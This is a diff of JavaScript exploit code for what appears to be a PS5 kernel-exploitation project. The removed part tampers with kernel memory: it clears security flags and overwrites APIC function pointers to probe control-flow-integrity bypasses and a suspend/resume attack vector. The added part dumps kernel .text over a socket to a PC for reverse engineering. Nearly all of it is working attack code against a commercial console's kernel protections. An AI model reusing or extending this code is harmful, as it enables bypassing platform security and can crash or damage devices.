@@ -612,448 +612,99 @@ async function main(userlandRW, wkOnly = false) {
         }
 
         ///////////////////////////////////////////////////////////////////////
-        // MYSTERY FLAG TEST - Data at 0xD11D08 (between sysentvec structures)
-        // Found via kernel_data.bin analysis - this is a DATA field, not func ptr
+        // KERNEL .TEXT DUMP - For IDA reverse engineering
         ///////////////////////////////////////////////////////////////////////
 
-        const MYSTERY_FLAG_OFFSET = 0xD11D08;
-        const MYSTERY_MASK_OFFSET = 0xD11D0C;
+        function htons_dump(port) {
+            return ((port & 0xFF) << 8) | (port >>> 8);
+        }
 
-        let mysteryFlagAddr = krw.kdataBase.add32(MYSTERY_FLAG_OFFSET);
-        let mysteryMaskAddr = krw.kdataBase.add32(MYSTERY_MASK_OFFSET);
+        function aton(ip) {
+            let chunks = ip.split('.');
+            let addr = 0;
+            for (let i = 0; i < 4; i++) {
+                addr |= (parseInt(chunks[i]) << (i * 8));
+            }
+            return addr >>> 0;
+        }
 
-        let mysteryFlagVal = await krw.read8(mysteryFlagAddr);
-        let mysteryMaskVal = await krw.read8(mysteryMaskAddr);
+        // CONFIGURE THESE FOR YOUR SETUP
+        const DUMP_NET_ADDR = aton("192.168.1.100");  // Your PC's IP
+        const DUMP_NET_PORT = htons_dump(9020);        // Port for dumpserver.py
 
-        await log("[MYSTERY] kdataBase = 0x" + krw.kdataBase, LogLevel.INFO);
-        await log("[MYSTERY] Flag @ 0x" + mysteryFlagAddr + " = 0x" + (mysteryFlagVal.low >>> 0).toString(16), LogLevel.INFO);
-        await log("[MYSTERY] Mask @ 0x" + mysteryMaskAddr + " = 0x" + (mysteryMaskVal.low >>> 0).toString(16), LogLevel.INFO);
-        await log("[MYSTERY] Expected: Flag=0x1, Mask=0x0FFFFFFF", LogLevel.INFO);
+        let dump_sock_addr_store = p.malloc(0x10);
+        let dump_sock_connected = 0;
+        let dump_sock_fd = 0;
 
-        let doMysteryTest = confirm(
-            "MYSTERY FLAG TEST\n\n" +
-            "Found data between sysentvec_ps5 and sysentvec_ps4:\n\n" +
-            "Flag @ 0x" + mysteryFlagAddr + "\n" +
-            "Current value: 0x" + (mysteryFlagVal.low >>> 0).toString(16) + "\n" +
-            "Expected: 0x00000001\n\n" +
-            "This is DATA (not a function pointer).\n" +
-            "CFI should NOT block this write.\n\n" +
-            "Click OK to try writing 0 to this flag.\n" +
-            "If NO CRASH = We found a writable security flag!"
+        async function dump_connect() {
+            dump_sock_fd = (await chain.syscall(SYS_SOCKET, AF_INET, SOCK_STREAM, 0)).low;
+            await log("[DUMP] Opened socket: " + dump_sock_fd, LogLevel.INFO);
+
+            for (let i = 0; i < 0x10; i += 0x8) {
+                p.write8(dump_sock_addr_store.add32(i), new int64(0, 0));
+            }
+
+            p.write1(dump_sock_addr_store.add32(0x00), 0x10);
+            p.write1(dump_sock_addr_store.add32(0x01), AF_INET);
+            p.write2(dump_sock_addr_store.add32(0x02), DUMP_NET_PORT);
+            p.write4(dump_sock_addr_store.add32(0x04), DUMP_NET_ADDR);
+
+            await log("[DUMP] Connecting to dump server...", LogLevel.INFO);
+            let connect_res = await chain.syscall(SYS_CONNECT, dump_sock_fd, dump_sock_addr_store, 0x10);
+            await log("[DUMP] Connected: " + connect_res, LogLevel.INFO);
+            dump_sock_connected = 1;
+        }
+
+        async function dump_send(buf, size) {
+            if (dump_sock_connected == 0) {
+                await dump_connect();
+            }
+            await chain.syscall(SYS_WRITE, dump_sock_fd, buf, size);
+        }
+
+        let doDump = confirm(
+            "KERNEL .TEXT DUMP\n\n" +
+            "This will dump the kernel code section for IDA analysis.\n\n" +
+            "Prerequisites:\n" +
+            "1. Run dumpserver.py on your PC (port 9020)\n" +
+            "2. Update DUMP_NET_ADDR in code to your PC's IP\n\n" +
+            "Current settings:\n" +
+            "IP: Check code (default 192.168.1.100)\n" +
+            "Port: 9020\n\n" +
+            "The dump will continue until PS5 crashes.\n" +
+            "Output: kernel_text.bin\n\n" +
+            "Click OK to start dump, Cancel to skip."
         );
 
-        if (doMysteryTest) {
-            await log("[MYSTERY] Writing 0 to mystery flag...", LogLevel.WARN);
-            await krw.write8(mysteryFlagAddr, new int64(0, mysteryFlagVal.hi));
+        if (doDump) {
+            // Kernel .text base - estimated from function pointers in kernel_data.bin
+            // Pointers like 0xFFFFFFFFD2BB09C0 suggest .text starts around 0xD2000000
+            let ktext_base = new int64(0xD2000000, 0xFFFFFFFF);
+            let dump_addr = ktext_base;
+            let dump_page = p.malloc(0x4000);
 
-            // If we get here, no crash!
-            let verifyVal = await krw.read8(mysteryFlagAddr);
-            await log("[MYSTERY] After write: 0x" + (verifyVal.low >>> 0).toString(16), LogLevel.INFO);
+            await log("[DUMP] Starting kernel .text dump from 0x" + dump_addr, LogLevel.WARN);
+            await log("[DUMP] Ensure dumpserver.py is running!", LogLevel.WARN);
 
-            if ((verifyVal.low >>> 0) === 0) {
-                await log("[MYSTERY] *** SUCCESS! Flag was modified without crash! ***", LogLevel.SUCCESS);
+            alert("Starting kernel .text dump...\n\nDump will continue until crash.\nCheck dumpserver.py for output.");
 
-                // Ask if user wants to keep flag at 0 and test behavior
-                let keepZero = confirm(
-                    "SUCCESS! Flag is writable!\n\n" +
-                    "Do you want to KEEP the flag at 0 and test effects?\n\n" +
-                    "Click OK to leave flag=0 and scan the gap area\n" +
-                    "Click Cancel to restore original and continue"
-                );
-
-                if (keepZero) {
-                    await log("[MYSTERY] Keeping flag at 0, scanning gap area...", LogLevel.WARN);
-
-                    // Scan the entire gap between sysentvec_ps5 and sysentvec_ps4
-                    // sysentvec_ps5 = 0xD11BB8, sysentvec_ps4 = 0xD11D30
-                    // Gap = 0x178 bytes (376 bytes)
-                    const GAP_START = 0xD11CB8;  // sysentvec_ps5 + 0x100 (after main struct)
-                    const GAP_END = 0xD11D30;    // sysentvec_ps4 start
-
-                    await log("[MYSTERY] Scanning gap: 0x" + GAP_START.toString(16) + " - 0x" + GAP_END.toString(16), LogLevel.INFO);
-
-                    let gapData = "";
-                    for (let off = GAP_START; off < GAP_END; off += 8) {
-                        let addr = krw.kdataBase.add32(off);
-                        let val = await krw.read8(addr);
-                        if (val.low !== 0 || val.hi !== 0) {
-                            gapData += "0x" + off.toString(16) + ": 0x" + (val.hi >>> 0).toString(16).padStart(8,'0') + (val.low >>> 0).toString(16).padStart(8,'0') + "\n";
-                        }
-                    }
-
-                    await log("[MYSTERY] Non-zero data in gap:\n" + gapData, LogLevel.INFO);
-
-                    alert(
-                        "FLAG LEFT AT 0!\n\n" +
-                        "The mystery flag is now 0.\n\n" +
-                        "Try these tests:\n" +
-                        "1. Run a game\n" +
-                        "2. Test suspend/resume\n" +
-                        "3. Check if homebrew behaves differently\n\n" +
-                        "Watch for crashes or behavioral changes!"
-                    );
-                } else {
-                    // Restore original
-                    await krw.write8(mysteryFlagAddr, mysteryFlagVal);
-                    await log("[MYSTERY] Restored original value", LogLevel.INFO);
+            for (let j = 0; ; j++) {
+                // Read kernel memory 8 bytes at a time into userspace buffer
+                for (let off = 0; off < 0x4000; off += 8) {
+                    let val = await krw.read8(dump_addr.add32(off));
+                    p.write8(dump_page.add32(off), val);
                 }
-            } else {
-                await log("[MYSTERY] Write may have been blocked. Value: 0x" + (verifyVal.low >>> 0).toString(16), LogLevel.WARN);
-            }
-        }
 
-        ///////////////////////////////////////////////////////////////////////
-        // SYSENTVEC DEEP ANALYSIS - Test sv_flags and Sony-specific fields
-        ///////////////////////////////////////////////////////////////////////
+                await dump_send(dump_page, 0x4000);
+                dump_addr = dump_addr.add32(0x4000);
 
-        const SYSENTVEC_PS5_OFFSET = 0xD11BB8;
-        const SYSENTVEC_PS4_OFFSET = 0xD11D30;
-
-        let sysentvecPs5 = krw.kdataBase.add32(SYSENTVEC_PS5_OFFSET);
-        let sysentvecPs4 = krw.kdataBase.add32(SYSENTVEC_PS4_OFFSET);
-
-        await log("[SYSENTVEC] Deep analysis of key fields...", LogLevel.INFO);
-
-        // Key fields from analysis:
-        // +0x00: sv_size (syscall count) - PS5=0x2D4 (724), PS4=0x2A5 (677) - WRITABLE!
-        // +0xA0: sv_flags (ABI flags) = 0x10209 (with Sony bit 0x10000)
-        // +0xD0: Sony field - PS5=0x190, PS4=0x1B0 - WRITABLE!
-
-        let sv_size = await krw.read8(sysentvecPs5);
-        let sv_flags = await krw.read8(sysentvecPs5.add32(0xA0));
-        let sony_d0 = await krw.read8(sysentvecPs5.add32(0xD0));
-
-        await log(`[SYSENTVEC] sv_size (+0x00): 0x${(sv_size.low>>>0).toString(16)} (${sv_size.low} syscalls)`, LogLevel.INFO);
-        await log(`[SYSENTVEC] sv_flags (+0xA0): 0x${(sv_flags.low>>>0).toString(16)}`, LogLevel.INFO);
-        await log(`[SYSENTVEC] Sony +0xD0: 0x${(sony_d0.low>>>0).toString(16)} (${sony_d0.low})`, LogLevel.INFO);
-
-        // ========== TEST 1: sv_flags Sony bit ==========
-        let testSvFlags = confirm(
-            "TEST 1: SV_FLAGS SONY BIT\n\n" +
-            "sv_flags = 0x" + (sv_flags.low>>>0).toString(16) + "\n\n" +
-            "Bit breakdown:\n" +
-            "  0x09 = SV_ABI_FREEBSD\n" +
-            "  0x200 = SV_ILP32 or other\n" +
-            "  0x10000 = SONY CUSTOM BIT\n\n" +
-            "Click OK to CLEAR the Sony bit (0x10000)\n" +
-            "This might disable Sony-specific security checks!"
-        );
-
-        if (testSvFlags) {
-            let addr = sysentvecPs5.add32(0xA0);
-            let original = await krw.read8(addr);
-            let newVal = (original.low >>> 0) & ~0x10000;
-
-            await log(`[SV_FLAGS] Clearing Sony bit: 0x${(original.low>>>0).toString(16)} -> 0x${newVal.toString(16)}`, LogLevel.WARN);
-            await krw.write8(addr, new int64(newVal, 0));
-
-            let verify = await krw.read8(addr);
-            if ((verify.low >>> 0) === newVal) {
-                await log("[SV_FLAGS] SUCCESS! Sony bit cleared!", LogLevel.SUCCESS);
-
-                let keep = confirm(
-                    "SV_FLAGS MODIFIED!\n\n" +
-                    "Sony bit (0x10000) is now CLEARED.\n" +
-                    "New value: 0x" + newVal.toString(16) + "\n\n" +
-                    "Click OK to KEEP and test behavior\n" +
-                    "Click Cancel to restore"
-                );
-
-                if (!keep) {
-                    await krw.write8(addr, original);
-                    await log("[SV_FLAGS] Restored original", LogLevel.INFO);
-                } else {
-                    await log("[SV_FLAGS] KEEPING MODIFIED - Test games/homebrew!", LogLevel.WARN);
-                }
-            } else {
-                await log("[SV_FLAGS] Write blocked or failed", LogLevel.WARN);
-                await krw.write8(addr, original);
-            }
-        }
-
-        // ========== TEST 2: Sony field +0xD0 ==========
-        let testSonyD0 = confirm(
-            "TEST 2: SONY FIELD +0xD0\n\n" +
-            "Current: 0x" + (sony_d0.low>>>0).toString(16) + " (" + sony_d0.low + ")\n" +
-            "PS4 value: 0x1B0 (432)\n\n" +
-            "This field DIFFERS between PS5/PS4.\n" +
-            "Already confirmed WRITABLE!\n\n" +
-            "Click OK to set to 0 and KEEP it"
-        );
-
-        if (testSonyD0) {
-            let addr = sysentvecPs5.add32(0xD0);
-            let original = await krw.read8(addr);
-
-            await log("[SONY +0xD0] Setting to 0...", LogLevel.WARN);
-            await krw.write8(addr, new int64(0, 0));
-
-            let verify = await krw.read8(addr);
-            if ((verify.low >>> 0) === 0) {
-                await log("[SONY +0xD0] Now 0 - test behavior!", LogLevel.SUCCESS);
-            }
-
-            // Don't restore - let user test
-        }
-
-        // ========== TEST 3: Disabled flags (0x00 + mask pattern) ==========
-        await log("\n[DISABLED FLAGS] Checking flags with value 0x00...", LogLevel.INFO);
-
-        // These are locations with flag=0x00 (potentially disabled features)
-        const DISABLED_FLAGS = [
-            { off: 0x0067ABFC, desc: "early data" },
-            { off: 0x007FB160, desc: "mid data" },
-            { off: 0x0099CB88, desc: "near security?" },
-        ];
-
-        for (let f of DISABLED_FLAGS) {
-            let addr = krw.kdataBase.add32(f.off);
-            let val = await krw.read8(addr);
-            await log(`  0x${f.off.toString(16)}: flag=0x${(val.low>>>0).toString(16)} (${f.desc})`, LogLevel.INFO);
-        }
-
-        let testDisabled = confirm(
-            "TEST 3: ENABLE DISABLED FLAGS?\n\n" +
-            "Found flags with value 0x00 (disabled?)\n\n" +
-            "These might be security features that are OFF.\n" +
-            "Enabling them (setting to 0x01) could:\n" +
-            "- Enable debug modes\n" +
-            "- Disable security checks\n" +
-            "- Change privilege behavior\n\n" +
-            "Click OK to enable first disabled flag"
-        );
-
-        if (testDisabled) {
-            let addr = krw.kdataBase.add32(DISABLED_FLAGS[0].off);
-            let original = await krw.read8(addr);
-
-            await log(`[DISABLED] Enabling 0x${DISABLED_FLAGS[0].off.toString(16)}...`, LogLevel.WARN);
-            await krw.write8(addr, new int64(1, original.hi));
-
-            let verify = await krw.read8(addr);
-            if ((verify.low >>> 0) === 1) {
-                await log("[DISABLED] Flag ENABLED!", LogLevel.SUCCESS);
-
-                let keep = confirm("Flag enabled! Keep it enabled for testing?");
-                if (!keep) {
-                    await krw.write8(addr, original);
-                    await log("[DISABLED] Restored", LogLevel.INFO);
+                if (j % 64 === 0) {
+                    await log("[DUMP] Progress: 0x" + dump_addr + " (" + (j * 0x4000 / 1024 / 1024).toFixed(1) + " MB)", LogLevel.INFO | LogLevel.FLAG_TEMP);
                 }
             }
-        }
 
-        ///////////////////////////////////////////////////////////////////////
-        // APIC READ TEST - Verify apic_ops offset (FW 4.03)
-        ///////////////////////////////////////////////////////////////////////
-
-        let apic_ops = krw.kdataBase.add32(0x170650);
-        let xapic_mode_ptr = apic_ops.add32(0x10);
-
-        let current_xapic_mode = await krw.read8(xapic_mode_ptr);
-        await log("[APIC] kdataBase = 0x" + krw.kdataBase, LogLevel.INFO);
-        await log("[APIC] apic_ops = 0x" + apic_ops, LogLevel.INFO);
-        await log("[APIC] xapic_mode_ptr = 0x" + xapic_mode_ptr, LogLevel.INFO);
-        await log("[APIC] xapic_mode value = 0x" + current_xapic_mode, LogLevel.INFO);
-
-        // Check if it looks like a kernel .text pointer (0xffffffffd2xxxxxx pattern)
-        let looks_valid = (current_xapic_mode.hi >>> 0) == 0xffffffff &&
-                          ((current_xapic_mode.low >>> 24) & 0xff) >= 0xd0;
-
-        await log("[APIC] Looks like valid kernel pointer: " + looks_valid, looks_valid ? LogLevel.SUCCESS : LogLevel.WARN);
-
-        // Optional: Uncomment below to enable crash test (DANGEROUS - will crash on resume!)
-        /*
-        let do_apic_crash_test = confirm("APIC Crash Test:\n\nxapic_mode @ 0x" + xapic_mode_ptr +
-                                "\nCurrent value: 0x" + current_xapic_mode +
-                                "\n\nThis will write 0xDEADBEEF. Put PS5 in rest mode after.\n" +
-                                "If PS5 crashes on RESUME, the offset is CORRECT.\n\nProceed?");
-
-        if (do_apic_crash_test) {
-            await log("[APIC] Writing 0xDEADBEEF to xapic_mode...", LogLevel.WARN);
-            await krw.write8(xapic_mode_ptr, new int64(0xDEADBEEF, 0));
-
-            let verify = await krw.read8(xapic_mode_ptr);
-            await log("[APIC] Verify: 0x" + verify, LogLevel.INFO);
-
-            alert("APIC TEST: Written!\n\nNow manually put PS5 in REST MODE.\n\n" +
-                  "If it CRASHES on resume = offset is CORRECT!\n" +
-                  "If it resumes normally = offset is WRONG.");
-        }
-        */
-
-        ///////////////////////////////////////////////////////////////////////
-        // CFI BYPASS TEST v2 - Use VALID function pointer swap
-        // Instead of garbage, write a REAL kernel function that passes CFI
-        ///////////////////////////////////////////////////////////////////////
-
-        // Helper to format int64 as hex string
-        function hex64(val) {
-            if (!val) return "null";
-            const hi = (val.hi >>> 0).toString(16).padStart(8, '0');
-            const lo = (val.low >>> 0).toString(16).padStart(8, '0');
-            return "0x" + hi + lo;
-        }
-
-        await log("[CFI v2] Reading all apic_ops function pointers...", LogLevel.INFO);
-        await log("[CFI v2] kdataBase = " + hex64(krw.kdataBase), LogLevel.INFO);
-
-        // apic_ops structure at offset 0x170650 from kdataBase
-        // Contains ~28 function pointers (FreeBSD apic_ops)
-        const APIC_OPS_OFFSET = 0x170650;
-        const apic_ops_base = krw.kdataBase.add32(APIC_OPS_OFFSET);
-
-        // Read all apic_ops function pointers
-        const apic_funcs = [];
-        const apic_names = [
-            "create", "init", "xapic_mode", "is_x2apic", "setup",
-            "dump", "disable", "eoi", "id", "intr_pending",
-            "set_logical_id", "cpuid", "alloc_vector", "alloc_vectors",
-            "enable_vector", "disable_vector", "free_vector", "enable_pmc",
-            "disable_pmc", "reenable_pmc", "enable_cmc", "enable_mca_elvt",
-            "ipi_raw", "ipi_vectored", "ipi_wait", "ipi_alloc", "ipi_free",
-            "set_lvt_mask"
-        ];
-
-        for (let i = 0; i < 28; i++) {
-            const ptr = await krw.read8(apic_ops_base.add32(i * 8));
-            apic_funcs.push(ptr);
-            const name = apic_names[i] || `func_${i}`;
-            await log(`[APIC ${i}] ${name}: ${hex64(ptr)}`, LogLevel.INFO);
-        }
-
-        ///////////////////////////////////////////////////////////////////////
-        // TEST: Overwrite RARELY-CALLED APIC functions
-        // These should NOT crash immediately because they're not called often
-        ///////////////////////////////////////////////////////////////////////
-
-        await log("[CFI v3] ===========================================", LogLevel.INFO);
-        await log("[CFI v3] Testing RARELY-CALLED APIC functions", LogLevel.INFO);
-        await log("[CFI v3] If write survives, we can try suspend/resume attack", LogLevel.INFO);
-
-        // Candidates: functions unlikely to be called during normal operation
-        const rare_funcs = [
-            { index: 5, name: "dump", desc: "debugging only" },
-            { index: 6, name: "disable", desc: "APIC shutdown only" },
-            { index: 21, name: "enable_mca_elvt", desc: "machine check, rare" },
-            { index: 25, name: "set_lvt_mask", desc: "LVT config, rare" },
-            { index: 26, name: "set_lvt_mode", desc: "LVT config, rare" },
-            { index: 27, name: "set_lvt_polarity", desc: "LVT config, rare" },
-        ];
-
-        // Which rare function to test (0-5)
-        const RARE_TEST_INDEX = 0;  // Start with dump (index 5 in apic_ops)
-
-        const target = rare_funcs[RARE_TEST_INDEX];
-        const target_addr = apic_ops_base.add32(target.index * 8);
-        const original_val = apic_funcs[target.index];
-
-        await log(`[CFI v3] Target: ${target.name} (${target.desc})`, LogLevel.INFO);
-        await log(`[CFI v3] Address: ${hex64(target_addr)}`, LogLevel.INFO);
-        await log(`[CFI v3] Current: ${hex64(original_val)}`, LogLevel.INFO);
-
-        const do_rare_test = confirm(
-            `RARE FUNCTION TEST\n\n` +
-            `Target: ${target.name} (apic_ops[${target.index}])\n` +
-            `Reason: ${target.desc}\n` +
-            `Address: ${hex64(target_addr)}\n` +
-            `Current: ${hex64(original_val)}\n\n` +
-            `Will write 0xDEADBEEF41414141\n\n` +
-            `If NO immediate crash, the function isn't called during normal operation.\n` +
-            `Then you can manually trigger REST MODE to test resume attack.\n\n` +
-            `Proceed?`
-        );
-
-        if (do_rare_test) {
-            await log(`[CFI v3] Writing garbage to ${target.name}...`, LogLevel.WARN);
-            await krw.write8(target_addr, new int64(0x41414141, 0xDEADBEEF));
-
-            const verify = await krw.read8(target_addr);
-            await log(`[CFI v3] Verify: ${hex64(verify)}`, LogLevel.INFO);
-
-            await log(`[CFI v3] Waiting 2 seconds to confirm no crash...`, LogLevel.INFO);
-            await new Promise(r => setTimeout(r, 2000));
-
-            await log(`[CFI v3] *** STILL ALIVE! ***`, LogLevel.SUCCESS);
-            await log(`[CFI v3] ${target.name} is not called during normal operation!`, LogLevel.SUCCESS);
-
-            alert(
-                `SUCCESS - No Crash!\n\n` +
-                `${target.name} is NOT called during normal operation.\n\n` +
-                `NOW: Manually put PS5 in REST MODE.\n` +
-                `If it crashes on RESUME, this function is called during resume.\n\n` +
-                `This could be our attack vector!`
-            );
-
-            // DON'T restore - let the user test resume
-            // await krw.write8(target_addr, original_val);
-        }
-
-        // Skip old tests
-        const CFI_TEST_INDEX = -1;  // disabled
-        const cfi_test_candidates = [];  // empty
-        for (let i = 0; i < cfi_test_candidates.length; i++) {
-            const c = cfi_test_candidates[i];
-            const addr = krw.kdataBase.add32(c.offset);
-
-            try {
-                const val = await krw.read8(addr);
-                const valHex = hex64(val);
-
-                // Check if looks like kernel pointer (hi=0xffffffff, reasonable range)
-                const valTopByte = (val.low >>> 24) & 0xff;
-                const isValid = (val.hi >>> 0) === 0xffffffff &&
-                               valTopByte >= 0x80 && valTopByte <= 0xff;
-
-                const marker = isValid ? "VALID" : "not-ptr";
-                await log(`[${i}] ${c.name}: ${valHex} [${marker}]`,
-                         isValid ? LogLevel.SUCCESS : LogLevel.WARN);
-            } catch (e) {
-                await log(`[${i}] ${c.name}: READ FAILED`, LogLevel.ERROR);
-            }
-        }
-
-        // If CFI_TEST_INDEX is set, do a write test
-        if (CFI_TEST_INDEX >= 0 && CFI_TEST_INDEX < cfi_test_candidates.length) {
-            const c = cfi_test_candidates[CFI_TEST_INDEX];
-            const addr = krw.kdataBase.add32(c.offset);
-
-            const proceed = confirm(
-                `CFI WRITE TEST #${CFI_TEST_INDEX}\n\n` +
-                `Target: ${c.name}\n` +
-                `Offset: 0x${c.offset.toString(16)}\n` +
-                `Address: 0x${addr}\n\n` +
-                `Will write 0x4141414141414141\n` +
-                `CRASH = CFI protected\n` +
-                `NO CRASH = EXPLOITABLE!\n\n` +
-                `Proceed?`
-            );
-
-            if (proceed) {
-                await log(`[CFI TEST] Reading original value...`, LogLevel.INFO);
-                const original = await krw.read8(addr);
-                await log(`[CFI TEST] Original: 0x${original}`, LogLevel.INFO);
-
-                await log(`[CFI TEST] Writing 0x4141414141414141...`, LogLevel.WARN);
-                await krw.write8(addr, new int64(0x41414141, 0x41414141));
-
-                // If we reach here, CFI didn't catch it!
-                await log(`[CFI TEST] *** WRITE SUCCEEDED - NO CFI CRASH! ***`, LogLevel.SUCCESS);
-                await log(`[CFI TEST] ${c.name} is EXPLOITABLE!`, LogLevel.SUCCESS);
-
-                // Restore original
-                await krw.write8(addr, original);
-                await log(`[CFI TEST] Restored original value`, LogLevel.INFO);
-
-                alert(
-                    `SUCCESS!\n\n` +
-                    `${c.name} at 0x${c.offset.toString(16)} is NOT CFI protected!\n\n` +
-                    `This can be used for code execution!`
-                );
-            }
-        } else if (CFI_TEST_INDEX >= 0) {
-            await log(`[CFI TEST] Invalid index: ${CFI_TEST_INDEX}`, LogLevel.ERROR);
-        } else {
-            await log("[CFI TEST] Read-only mode. Set CFI_TEST_INDEX to test a candidate.", LogLevel.INFO);
+            // Should never reach here - dump runs until crash
+            await log("[DUMP] Dump complete (unexpected)", LogLevel.INFO);
         }
 
         ///////////////////////////////////////////////////////////////////////
